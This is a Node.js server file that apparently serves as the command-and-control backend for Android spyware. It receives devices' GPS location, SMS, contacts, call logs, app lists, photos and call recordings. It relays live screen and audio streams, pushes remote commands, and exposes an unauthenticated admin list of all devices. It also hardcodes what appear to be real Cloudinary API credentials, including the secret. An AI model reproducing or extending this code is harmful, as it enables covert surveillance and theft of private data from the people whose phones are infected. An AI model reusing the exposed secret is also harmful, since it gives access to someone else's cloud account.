const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io");
const compression = require('compression'); 

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// ==================================================
// ✅ 1. OPTIMIZED SOCKET.IO SETUP
// ==================================================
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8, // 100MB
    pingTimeout: 60000,     
    pingInterval: 25000,    
    transports: ['websocket', 'polling']
});

// --- CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(compression()); 
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status (RAM Storage)
let devicesStatus = {}; 

// ==================================================
//  🔥 UNIFIED SOCKET LOGIC (FIXED FOR VIDEO & COMMANDS)
// ==================================================
io.on('connection', (socket) => {
    
    console.log(`👤 New Connection ID: ${socket.id}`);

    // ✅ FIX: Unified Join (Dono Android aur Web ek hi room pipe mein honge)
    const handleJoin = (roomID) => {
        if (!roomID) return;
        const cleanID = roomID.toString().trim().toUpperCase();
        socket.join(cleanID);
        console.log(`🔌 Unified Room Joined: ${cleanID}`);
    };

    socket.on('join', handleJoin);
    socket.on('join-room', handleJoin); // Backward compatibility ke liye rakha hai

    // ✅ WebRTC SIGNALING FIX (Direct Relay to Target)
    socket.on("offer", (data) => {
        if (!data.target) return;
        const target = data.target.toString().trim().toUpperCase();
        console.log(`📡 Offer Relaying to: ${target}`);
        // Dashboard se offer Android ko jayega
        socket.to(target).emit("offer", data); 
    });

    socket.on("answer", (data) => {
        if (!data.target) return;
        const target = data.target.toString().trim().toUpperCase();
        console.log(`📡 Answer Relaying to: ${target}`);
        // Android se answer Dashboard ko jayega
        socket.to(target).emit("answer", data);
    });

    socket.on("candidate", (data) => {
        if (!data.target) return;
        const target = data.target.toString().trim().toUpperCase();
        socket.to(target).emit("candidate", data);
    });

    // Screen Share (Legacy/Direct Buffer)
    socket.on('screen-data', (data) => {
        if (data.room) {
            const room = data.room.toString().trim().toUpperCase();
            socket.to(room).emit('screen-data', data.image);
        }
    });

    // Control Event (For Start/Stop)
    socket.on('control-event', (data) => {
        if (!data.room) return;
        const room = data.room.toString().trim().toUpperCase();
        console.log(`🎮 Control Action: ${data.action} -> Room: ${room}`);
        io.to(room).emit('control-event', data); 
    });

    // Command Handling
    socket.on('send-command', (data) => {
        const target = (data.targetId || data.deviceId || "").toString().trim().toUpperCase();
        if (target && data.command) {
            console.log(`⚡ Socket Command: ${data.command} -> ${target}`);
            io.to(target).emit('command', data.command);
            
            if (!devicesStatus[target]) devicesStatus[target] = { id: target };
            devicesStatus[target].command = data.command;
        }
    });

    // Audio Stream Relay
    socket.on('audio-stream', (blob) => {
        socket.rooms.forEach(room => {
            if (room !== socket.id) socket.to(room).emit('audio-stream', blob);
        });
    });

    socket.on('disconnect', () => { 
        console.log(`❌ Disconnected: ${socket.id}`);
    });
});



// ==================================================
//  ✅ STATUS & COMMAND (Preserving Battery/Location)
// ==================================================

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        if (!devicesStatus[id]) {
            devicesStatus[id] = { id: id, command: "none" };
        }

        devicesStatus[id].model = model || devicesStatus[id].model || "Unknown";
        devicesStatus[id].battery = battery || level || devicesStatus[id].battery || 0;
        devicesStatus[id].version = version || devicesStatus[id].version || "--";
        devicesStatus[id].charging = (String(charging) === "true");
        
        devicesStatus[id].lat = lat || devicesStatus[id].lat || 0;
        devicesStatus[id].lon = lon || devicesStatus[id].lon || 0;
        devicesStatus[id].accuracy = accuracy || devicesStatus[id].accuracy || 0;
        devicesStatus[id].speed = speed || devicesStatus[id].speed || 0;
        
        devicesStatus[id].lastSeen = Date.now();

        let commandToSend = "none";
        if (devicesStatus[id].command && devicesStatus[id].command !== "none") {
            commandToSend = devicesStatus[id].command;
            devicesStatus[id].command = "none"; 
        }

        res.json({ status: "success", command: commandToSend });
    } catch (e) {
        res.status(500).json({ error: "Server Error" });
    }
});

// ==================================================
//  ✅ DATA STORAGE (SMS, CONTACTS, APPS)
// ==================================================

app.post('/api/upload_data', async (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        let finalData = parsedData;

        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude;
                devicesStatus[id].lastSeen = Date.now();
            }
            finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
        }
        else if (type === 'contacts') {
            let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
            const seenNumbers = new Set();
            finalData = [];
            for (const contact of rawList) {
                let rawNum = contact.phoneNumber || contact.number || '';
                let num = rawNum.replace(/\s+|-/g, ''); 
                if (num && !seenNumbers.has(num)) {
                    seenNumbers.add(num);
                    finalData.push({ name: contact.name || "Unknown", number: num });
                }
            }
            finalData.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
        }
        else if (['installed_apps', 'apps', 'call_logs', 'sms'].includes(type)) {
             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
        } 
        else {
            let existingData = [];
            try {
                if (fs.existsSync(filePath)) {
                    existingData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                }
            } catch (e) { }
            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            finalData = [...newDataArray, ...existingData].slice(0, 5000); 
        }

        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });

    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
//  ✅ GALLERY & AUDIO UPLOADS
// ==================================================

app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data, type } = req.body; 
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderName = (type && type !== "null") ? type.split("-")[0] : "gallery";
    let publicId = (type && type.includes("-")) ? type.split("-")[1] : Date.now().toString();

    cloudinary.uploader.upload(image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data, 
        { folder: `${id}/${folderName}`, public_id: publicId, resource_type: "image" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-file', { device_id: id, url: result.secure_url, type: folderName });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.post('/api/upload-audio', (req, res) => {
    let { device_id, audio_data, filename } = req.body; 
    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    cloudinary.uploader.upload(audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data, 
        { folder: `${id}/calls`, public_id: filename || Date.now().toString(), resource_type: "video" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

// ==================================================
//  ✅ GETTERS & ADMIN
// ==================================================

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    res.json({ ...device, isOnline: (Date.now() - device.lastSeen) < 60000 });
});

app.get('/api/admin/all-devices', (req, res) => res.json(devicesStatus));

app.post('/api/send-command', (req, res) => {
    let { device_id, deviceId, command } = req.body;
    let target = (device_id || deviceId || "").toUpperCase().trim();
    if (!target) return res.status(400).json({ error: "No target" });
    
    io.to(target).emit('command', command);
    if (!devicesStatus[target]) devicesStatus[target] = { id: target };
    devicesStatus[target].command = command;
    res.json({ status: "success", command: command });
});

app.get('/', (req, res) => res.send('✅ Unified Server: Video & Data Fixed'));

server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
